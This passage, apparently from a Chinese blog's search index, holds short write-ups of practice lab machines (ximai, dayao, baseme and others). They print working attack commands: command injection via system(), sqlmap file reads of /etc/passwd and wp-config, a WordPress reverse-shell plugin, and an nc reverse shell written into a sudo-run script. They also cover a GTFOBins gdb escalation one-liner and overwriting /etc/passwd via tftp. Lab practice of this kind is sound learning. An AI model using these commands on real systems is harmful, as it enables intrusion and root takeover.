（dirsearch扫出来很多没用的）\nNMAP扫描 我们可以抓包看看怎么显示的\nNMAP扫描 发现是base64的 解密出来是1+2 我们直接试试改其他的发现也可以 然后直接system(\u0026lsquo;whoami\u0026rsquo;) 发现可以\nNMAP扫描 NMAP扫描 好了WEB结束\n拿到shell权限 # sudo -l 发现可以执行py脚本是一个写入序列化的数据 琢磨了很久 最后不会了看的WP 是挟持import文件\nimport pickle\ndiary = {\u0026ldquo;November28\u0026rdquo;:\u0026ldquo;i found a blue viola\u0026rdquo;,\u0026ldquo;December1\u0026rdquo;:\u0026ldquo;i lost my blue viola\u0026rdquo;} p = open(\u0026lsquo;diary.pickle\u0026rsquo;,\u0026lsquo;wb\u0026rsquo;) pickle.dump(diary,p)\n我们挟持这个文件 他的目录可以写入文件就离谱\nNMAP扫描 拿root # 得到ROSE然后又可以执行 .plantbook 这是一个写入什么打印的脚本\n但是很关键\u0026mdash;\u0026hellip;\u0026hellip; 我也没想出来 这文件是我们的我们可以修改啊 \u0026mdash;-\nNMAP扫描 拿下了\n总结一下喽 # 1：多看看数据包\n2：多试试目录功能\n3：Import劫持学到了 看看权限明明可以写入的\n","date":"3 June 2025","externalUrl":null,"permalink":"/posts/flower/","section":"Posts","summary":"","title":"flower靶机---难度low知识点-base64-py","type":"posts"},{"content":"","date":"3 June 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/logic/","section":"Tags","summary":"","title":"Logic","type":"tags"},{"content":" mixue靶机\u0026mdash;难度群友知识点-logic-monitor # 你爱我我爱你蜜雪冰城甜蜜蜜\nNmap扫描发现端口开放 # NMAP扫描 直接登录然后dirsearch不要停\nNMAP扫描 好经典的登录界面啊别说了开扫\nNMAP扫描 一扫不知道啊 没扫中。。。。看看网页发现一个用户sublarge 他是弱口令 123456上去了\nNMAP扫描 这种很简单 看数据包 发现是通过cookie里面值来判断的 但是注意你修改都要把0改为1\nNMAP扫描 NMAP扫描 好了WEB结束了我们拿到了shell\n拿到shell权限 # NMAP扫描 翻文件发现了密码然后我们运行下pspy64发现一直在运行monitor\nNMAP扫描 NMAP扫描 看看什么意思 意思是编辑了key就执行change.sh (下面那个root是我做完看的)\n这是suraxddq的文件 我们试试同一个密码可以上去不 发现可以 然后可以\n拿root # 下面是change.sh的作用 就是给权限 我们可以直接复制bash然后-p运行\nNMAP扫描 NMAP扫描 拿到了root了\n总结一下喽 # 1：多看看数据包\n2：monitor 是一个监控的程序\n3：pspy64可以看进程 前面有具体用户号\n4：密码复用\n","date":"2 June 2025","externalUrl":null,"permalink":"/posts/mixue/","section":"Posts","summary":"","title":"mixue靶机---难度群友知识点-logic-monitor.我冰城呢","type":"posts"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/monitor/","section":"Tags","summary":"","title":"Monitor","type":"tags"},{"content":"","date":"29 May 2025","externalUrl":null,"permalink":"/tags/sqlmap/","section":"Tags","summary":"","title":"Sqlmap","type":"tags"},{"content":" ximai靶机\u0026mdash;难度easy-medium-知识点-wp-sqlmap-wpplugin # 这里应该有很多步骤拿shell 但我好像选择了最难的\nNmap扫描发现3个端口开放 # 看到这里你肯定笑嘻了 肯定是mysql skip对吧但是没有卵用\nNMAP扫描 如图所示 mysql上不去\nNMAP扫描 那就经典的扫描目录加上登录网站看看什么内容\n80是一个经典的apache目录这里不说了\n\u0026ndash;你的字典不行啊有一个提示没扫出来\u0026hellip; reminder.php 这里有个这个文件网站但是我没用上..\nNMAP扫描 这里有info.php但是我没有用到 有一个adminer.php 是一个登录数据库的网站\nNMAP扫描 这里我用了包含因为前面PHP包含打开了 但是没用上，然后sql注入试了试也不行就放弃了转向8000端口 是个wordpress 注意改域名\n扫描下目录\nNMAP扫描 1:这里发现很多东西但是我也没找到什么东西能用上- 这时候就用用wpscan扫描一下 只扫了一个用户adminer\n2:插件扫太久了 卡了很久 问了下老哥 就用了下nuclei 没想到直接爆出来了\n​\tNMAP扫描 就是这个CVE2015 这里还有poc 你拿去访问下发现直接爆出了 数据库名字\n​\tNMAP扫描 这里直接启动sqlmap 但是注意你也要分析下这个poc 我通过yakit保存了数据包然后 -r 来使用要在参数后面加*\nNMAP扫描 1：后面用sqlmap读取了数据库wp密码但是我不会解密 试了os 也不行 又试了试文件读取可以\npoc:\npython .\\sqlmap.py -r .\\1234.txt \u0026ndash;level 4 \u0026ndash;risk=2 \u0026ndash;file-read=\u0026quot;/etc/passwd\u0026quot;\n2：注意看文件保存位置然后发现了两个用户 一共jimmy 一个 adminer 然后经典的爆破直接不行 好吧\n3：然后因为这是个WP有wp-config这个文件的 但是我不知道位置 就只能一个个试 在/var/www/wordpress/wp-config.php 里面读出来然后有数据库的密码\nNMAP扫描 我们上到这里来改wp用户的密码 注意它是md5 所以你要把密码加密为md5放上去才行 这里我放的是111\n然后我们登录wp\nNMAP扫描 wp反弹shell 一般都是写插件 这里我试了下\n4m3rr0r/Reverse-Shell-WordPress-Plugin: A WordPress plugin that provides reverse shell functionality with a graphical user interface (GUI) for configuration. This plugin allows users to configure and initiate a reverse shell connection to a specified IP address and port.\n发现用不了又试了试下面这个payload\nNMAP扫描 然后放到压缩文件里面 上传 他直接自动执行了 记得激活\n拿到shell权限 # NMAP扫描 这里作者给了adminer的密码 adminer123456 可能有bug 直接给我了\n拿root # NMAP扫描 这里sudo 可以使用grep 但是什么都做不了\nNMAP扫描 但是但是你注意到了没有\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;他可写\u0026hellip;\nNMAP扫描 这里grep里面写的是nc命令\n然后那边nc监听即可\nNMAP扫描 总结一下喽 # 1：懵懵懂懂的 熟悉下sqlmap\n2：wp的插件反弹shell\n3：数据库md5 修改用户\n4：看文件可不可写\n","date":"29 May 2025","externalUrl":null,"permalink":"/posts/ximai/","section":"Posts","summary":"","title":"ximai靶机---难度LOW-easy-知识点-wp-sqlmap-wpplugin","type":"posts"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/tags/socat/","section":"Tags","summary":"","title":"Socat","type":"tags"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/tags/tmp/","section":"Tags","summary":"","title":"Tmp","type":"tags"},{"content":" translate靶机\u0026mdash;难度LOW-easy-知识点-tmp-定时任务-socat # 只做了user\nNmap扫描发现3个端口开放 # NMAP扫描 ​ 一访问发现是个软蛋 扫描一下目录\n​\tNMAP扫描 这里发现了 一个登录框但是没有爆破也没用，我们访问一下5001端口可以也dir一下发现info目录\n​\tNMAP扫描 进入叫我们可以构造数据包访问可以获取数据\n我们可以curl http://172.20.10.2:5001 -X POST -H \u0026lsquo;Content-Type: application/json\u0026rsquo; -d \u0026lsquo;{\u0026ldquo;source_lang\u0026rdquo;:\u0026ldquo;a\u0026rdquo;,\u0026ldquo;target_lang\u0026rdquo;:\u0026ldquo;x\u0026rdquo;,\u0026ldquo;text_list\u0026rdquo;:[\u0026ldquo;就你也想要账号？？？？\u0026rdquo;]}\u0026rsquo; 这个可以获得密码\n也可以 就你也想要账号？？？？ 直接换成系统命令 因为你改命令发现可以执行\n拿到账号密码\n1：可以登录那个窗口弹shell\n2：通过上面直接拿shell 都可以\n拿到shell权限 # 我们拿到权限翻啊翻我翻到opt里面有 pspy64 进程查看工具可以查看定时任务等进程\n​\tNMAP扫描 发现在执行/tmp/bash\tNMAP扫描 look look\n1: www的 tmp目录的和普通用户的是不同的 所以你直接把命令写到tmp是不行的 我们需要一个正常用户他是可以访问tmp的\n我们访问家目录发现有一个网页开了8000端口但是我们主机访问不到我们socat一下端口转发\nNMAP扫描 把文件写到user.txt里面然后mv\n我们主机可以访问了因为这个程序是welcome的权限 并且可以执行mv 这就是解题最优解在这里\nNMAP扫描 2:同时因为是welcome的权限可以访问正常tmp所以反弹成功\n拿root # NMAP扫描 总结一下喽 # 1：ss -lntup 查看端口进程 | socat 可以转发端口 | pspy64 不用root可以看定时任务等\n2：tmp目录www是隔离的 和 普通用户不同\nNMAP扫描 www的文件在这里被apache隔离了\n","date":"28 May 2025","externalUrl":null,"permalink":"/posts/translate/","section":"Posts","summary":"","title":"受益匪浅translate靶机---难度LOW-easy-知识点-tmp-定时任务-socat","type":"posts"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/","section":"Tags","summary":"","title":"定时任务","type":"tags"},{"content":" baseme靶机\u0026mdash;难度LOW-知识点-爆破ssh密钥-base64语法- # Nmap扫描发现 # 经典组合上网页看看\nNMAP扫描 进入网页解密上面的base64 提示了\n：ALL, absolutely ALL that you need is in BASE64. Including the password that you need :) Remember, BASE64 has the answer to all your questions. -lucas\n这里获得了一个用户lucas 提示到了包含base64 可能是用base64来跑目录 既然都提到了base64我们把下面提示来base64来跑一下lucas密码发现不行\nNMAP扫描 使用下面语法 来把字典变为base64来跑一下目录\nat /usr/share/dirb/wordlists/common.txt|awk \u0026lsquo;{system(\u0026ldquo;echo \u0026ldquo;$0\u0026rdquo;|base64\u0026rdquo;)}\u0026rsquo; \u0026gt; b.txt\nNMAP扫描 发现跑到了翻译下是id_rsa私钥我们拿着私钥反编译base64登录发现要密码\nNMAP扫描 记得私钥给权限700不然用不了\n我们使用ssh-keygen -y -f id_rsa2 发现确实要密码\n但是我们一开始不是拿到了一些字符吗那个base64来解密一下试试\n先把私钥转换base64使用 ssh2john\nNMAP扫描 成功跑到密码 如果john卡了就ps一下 kill -9 进程号\nNMAP扫描 拿到shell权限 # 我们拿到私钥登录\nNMAP扫描 发现可以用base64\n拿root # 这里思路 我们可以直接拿root.txt\nsudo /usr/bin/base64 \u0026lsquo;/root/root.txt\u0026rsquo; | base64 \u0026ndash;decode\n也可以判断对方root有auth文件 我们拿私钥试试\nNMAP扫描 拿到后给权限登录就行\nNMAP扫描 总结一下 # 1：awk编辑文本命令 awk \u0026lsquo;{system(\u0026ldquo;echo \u0026ldquo;$0\u0026rdquo;|base64\u0026rdquo;)}\n2：ssh私钥是可以加密的 不要忘了 ssh2john来解密\n","date":"26 May 2025","externalUrl":null,"permalink":"/posts/baseme/","section":"Posts","summary":"","title":"baseme靶机---难度LOW-知识点-爆破ssh密钥-base64语法-","type":"posts"},{"content":" connection靶机\u0026mdash;难度LOW-知识点-smb-enm4linux # Nmap扫描发现 # NMAP扫描 发现了经典的445\n你可以\nsmbclient -L //172.20.10.2 -N 匿名访问查看分享内容\n也可以\nenum4linux 172.20.10.2 工具分析\n发现了一个目录叫share进去可以上传文件我们上传一个php脚本或者shell\nsmbclient //172.20.10.2/share 直接登录回车\nNMAP扫描 拿到shell权限 # 不知道为什么弹半天弹不上 用python可以弹上\nNMAP扫描 拿root # 上传扫描文件linepas 发现有一个suid权限的gdb\ngdb -nx -ex \u0026#39;python import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; -ex quit 输入代码提权\nNMAP扫描 总结一下 # 1：smb -L 查看分享的东西 -N 匿名\n","date":"26 May 2025","externalUrl":null,"permalink":"/posts/connection/","section":"Posts","summary":"","title":"connection靶机---难度LOW-知识点-smb-enm4linux","type":"posts"},{"content":"","date":"26 May 2025","externalUrl":null,"permalink":"/tags/creatab/","section":"Tags","summary":"","title":"Creatab","type":"tags"},{"content":"","date":"26 May 2025","externalUrl":null,"permalink":"/tags/smb/","section":"Tags","summary":"","title":"Smb","type":"tags"},{"content":"","date":"26 May 2025","externalUrl":null,"permalink":"/tags/ssh2john/","section":"Tags","summary":"","title":"Ssh2john","type":"tags"},{"content":"","date":"26 May 2025","externalUrl":null,"permalink":"/tags/tftp/","section":"Tags","summary":"","title":"Tftp","type":"tags"},{"content":" dayao靶机-知识点-tftp69-定时任务 # Nmap扫描发现两个端口开放 # NMAP扫描 ​ 访问一下网址(他提示了目录穿越)\n​\tNMAP扫描 ​\n​ 同时dirsearch一下 这里的a和passwd和phpinfo是我后面写的 发现有一个file.php和upload.php\nNMAP扫描 我们可以使用WFUZZ来爆破一下目录穿越（这里使用../可能被过滤了我们双写绕过\u0026hellip;./）\nNMAP扫描 发现了file参数可用我们直接网址访问下发现了wujing和tftp服务这是UDP的服务69端口所以我们扫描端口不要忘记扫描UDP啊！！！\nNMAP扫描 NMAP扫描 登录试试\nNMAP扫描 我们put一个文件上传上去试试能不能访问\nNMAP扫描 发现可以直接访问直接使用反弹shell\nNMAP扫描 拿到shell权限 # 拿到了shell翻啊翻没什么东西我们用一个工具可以查看进程pspy\nNMAP扫描 发现有一个NC反弹定时任务\n通过密码登录login.php\nNMAP扫描 直接反弹了wujing\nNMAP扫描 ![v\n我们先写SSH写完登录后sudo -l 发现可以使用tftp\nNMAP扫描 拿root # 这里思路有：\n​\t1：我们把passwd下载下来 修改里面root里面的x为hash值111111使用mkpasswd生成\n​\t2: 我们在etc下面get passwd文件覆盖原先的passwd然后登录\nNMAP扫描 在etc下面get覆盖\nNMAP扫描 然后登录root 拿到ROOT权限\nNMAP扫描 总结一下我们可以用find来看看新的文件 # 1：ps里面查看不了的可以使用这个工具来查看全面\n2：nmap扫描可以扫描UDP不只有TCP\n3：目录穿越可以双写过滤\n4：passwd里面x修改后与shadow里面密码可能有造成系统问题 自己机器别瞎改\nNMAP扫描 ","date":"26 May 2025","externalUrl":null,"permalink":"/posts/dayao/","section":"Posts","summary":"","title":"大窑dayao靶机---难度LOW-知识点-tftp-udp-定时任务","type":"posts"},{"content":"","date":"23 May 2025","externalUrl":null,"permalink":"/tags/module/","section":"Tags","summary":"","title":"Module","type":"tags"},{"content":" VulNyx-infected靶机-知识点-module # Nmap扫描发现两个端口开放 # NMAP扫描 同时dirsearch一下\ndirsearch 可以只有一个info.php 打开是一个phpinfo界面\ndirsearch 这里我爆破了但是没用看了下WP发现有一个module backdoor 可以利用\ndirsearch 命令就是在文件头加上\nBackdoor: 系统命令\ndirsearch 拿到shell权限 # 很简单直接sudo -l 上网站https://gtfobins.github.io/ 搜对应的提权即可后面都很简单\ndirsearch 然后我们加一个SSH 登录方面免得有些功能不能用\ndirsearch SSH登录发现可以用一个joe\njoe:是一个文本编辑器 通过ctrl+k ! /bin/bash 可以直接执行命令造成提权\ndirsearch 提权ROOT\n拿到root # dirsearch # 总结一下 # PHPinfo里面可以看配置以外，也可以看看模组\n","date":"23 May 2025","externalUrl":null,"permalink":"/posts/infected/","section":"Posts","summary":"","title":"VUlNyx-infected靶机---难度LOW-知识点-backdoor-module","type":"posts"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/agent/","section":"Tags","summary":"","title":"Agent","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/dirb/","section":"Tags","summary":"","title":"Dirb","type":"tags"},{"content":" Vulnyx-agent靶机-LOW-知识点-Agent-dirb工具 # NMAP发现 # 1:nmap靶机发现开了两个端口80和22 # test 2:我们上网页看看发现什么都没有发现然后使用dirsearch什么都扫不到 # test 3:然后这里等了很久不知道干嘛看了下WP看了一下工具发现还有一个叫dirb的他和dirsearch区别是有一个递归查询我们用它来查询可以发现爆破出来了很多 # test 4:发现一个websvn 我们可以直接登录看看页面 # test 5：直接搜一搜nday 然后发现直接可以弹shell\ntest 成功拿到webshell # test 1:我们拿到的shell后我翻了很多文件发现不行 爆破了也没爆破出来用户叫dustin的我们试试sudo -l发现可以用一个叫C99的程序 （C语言标准版本） # 这里注意用这个c99需要一个终端我们来上一个终端\ntest 2：这里用-u dustin来使用然后到https://gtfobins.github.io/gtfobins/c99/ 来使用提权代码 # test 为了方便使用我们设置下SSH公钥登录\ntest 3:公钥登录后直接sudo -l发现可以用一个叫ssh-agent的 # ssh-agent: 是一种用于管理 SSH 密钥的工具,通过将私钥加载到 ssh-agent 中，后续连接时无需手动输入私钥密码\n我们依然在前面搜索下提权代码\nsudo /usr/bin/ssh-agent /bin/bash\ntest 成功get root # test # TIPs # 1：dirb 是一个递归的爆破和dirsearch不同 默认字典在/usr/share/dirb/wordlists/common.txt\n还有一个密码字典推荐下usr/share/john/password.lst\n2：sudo -u xx 指定用户使用命令\n","date":"22 May 2025","externalUrl":null,"permalink":"/posts/agent/","section":"Posts","summary":"","title":"Vulnyx-agent靶机-LOW-知识点-Agent-dirb工具","type":"posts"},{"content":"","date":"19 May 2025","externalUrl":null,"permalink":"/tags/bash_history/","section":"Tags","summary":"","title":"Bash_history","type":"tags"},{"content":" Commit靶机-知识点-看 # 我是懦夫我没做出来\nNmap扫描发现两个端口开放 # NMAP扫描 同时dirsearch一下\ndirsearch 可以发现有几个目录\n拿到shell权限 # 但是我们依次访问或者对登录口做爆破啊 sql注入啊发现没有 这时候可以看看源码（其实一开始就可以看看）\n源码 通过密码登录login.php\n源码 但是我测试很久的上传和PING；都不行 因为有一个upload文件夹想到上传后可以包含一下通过源码下面的file参数但是都加载不了\n于是我们先查看一下etc/passwd发现可以\u0026ndash;但是其他都做不了但是我们得到了一个用户lingmj\n源码 这时候就要想到.bash_history了\n源码 再查看git/config 源码 拿到一个密码直接登录拿到shell 和userflag\n源码 拿root # 1:我们可以看看SSH的配置文件因为它改端口了2222了\n源码 发现有Root密码但是拒绝了SSH登录我们可以本地登录过去\n源码 2：我们可以翻阅etc下面的passwd- 和shadow-获取信息\n发现passwd我们可以看通过passwd-以前的配置文件发现注释有一个密码 是welcome的\n源码 登录上去也没啥用\n总结一下我们可以用find来看看新的文件 # find / -newer /etc/passwd 2\u0026gt;a | grep -Pv \u0026lsquo;sys|proc|var|run|share|dev|tmp|git\u0026rsquo;\n-newer /etc/passwd ：比etcpasswd新的\n通过正则过滤掉sys|proc|var|run|share|dev|tmp|git开头 就会发现新的文件\n源码 多看看一些配置文件对一些东西很敏感比如端口改了你就应该去看看SSH配置文件\n","date":"19 May 2025","externalUrl":null,"permalink":"/posts/commit/","section":"Posts","summary":"","title":"Commit靶机---难度LOW-知识点-bash_history","type":"posts"},{"content":"","date":"19 May 2025","externalUrl":null,"permalink":"/tags/ssh/","section":"Tags","summary":"","title":"SSH","type":"tags"},{"content":" Qingmei靶机 知识点-banner # NMAP发现 # nmap靶机发现开了两个端口80和22但是我们到网页发现不到什么目录也扫不到什么我们可以SSH试一试看看\ntest 发现一个banner写了账号和密码我们直接登录上去\nps:banner就是用户自定义显示的东西 你一上去就显示出来的比如下面的牛子\ntest 一进去点下h弹出命令界面直接下拉看到了一个!command\n可以试一下command id 试试可以不可以执行出命令\ntest 发现可以执行出命令\ntest 那可以直接弹SHELL 或者!sh试试\ntest 但是我们用着特别难受 开一个终端就要重新进去那个界面这里介绍一个文件\n.bashrc：用于储存用户的个性化设置。在每次打开新的终端时自动执行特定的命令或脚本\n我们可以去看看这个文件是不是添加了什么\ntest 发现有一个less banner 然后exit我们把它删除然后ssh看看可以登录不\ntail -n 2 ~/.bashrc :取后两行查看\nsed -i \u0026lsquo;$d;$d\u0026rsquo; ~/.bashrc ：删除最后两行\n然后我们弹终端就不会进入那个界面或者直接SSH登录上去就行\ntest 然后我们要研究下怎么提权\n我们发现home 下面有一个morri 用户我们进入不了\n1：我们直接SSH 猜测弱密码morri\ntest 2:翻到了/opt下面的文件有一个\ntest 他叫你输入一个A来完成任务你可以一次一次的输入也可以 -h 查看有没有什么其他功能发现可以 \u0026ndash;dashazi直接输出\ntest get到了密码\n到了morri用户 # 我们直接sudo -l 发现了\n(ALL) NOPASSWD: /usr/bin/ranger\n这是一个文件编辑器很简单了直接sudo运行查看即可\ntest 然后大写S 拿到终端\ntest TIPs # opt目录是一个存软件的目录有些软件没有在默认的usr就在这里 所以可以看看这个目录\n你可以试试跳过配置登录SSH 指定命令可以越过bashrc\n","date":"19 May 2025","externalUrl":null,"permalink":"/posts/qingmei/","section":"Posts","summary":"","title":"群友Qingmei靶机-LOW-知识点-SSH","type":"posts"},{"content":" Loower靶机-包含知识点呃呃呃\u0026ndash;SSH # 1：通过FTP发现了两个用户一个是ftpuser,通过爆破获得密码登录 # 2：通过ftpuser进入shell 然后查看welcome 发现有一个 backup.sh # cat一下发现welcome密码通过john爆破得出密码 # 3：然后牛逼的就来了 发现sudo 有一个什么figlet 你会想和cowsay有用吗 但是.. 零蛋！ 直接SSHroot因为什么发现welcome下有SSH目录可能可以直接登录 # welcome/.ssh/id_rsa root@172.20.10.2 来登录root 因为包含了welcome的公钥\n测试图片加载 谢谢观看 # ","date":"17 May 2025","externalUrl":null,"permalink":"/posts/loweeeeee/","section":"Posts","summary":"","title":"Loower靶机---难度LOW-知识点-SSH观察","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"这里是归档页面。\n","externalUrl":null,"permalink":"/archives/","section":"归档","summary":"","title":"归档","type":"archives"}]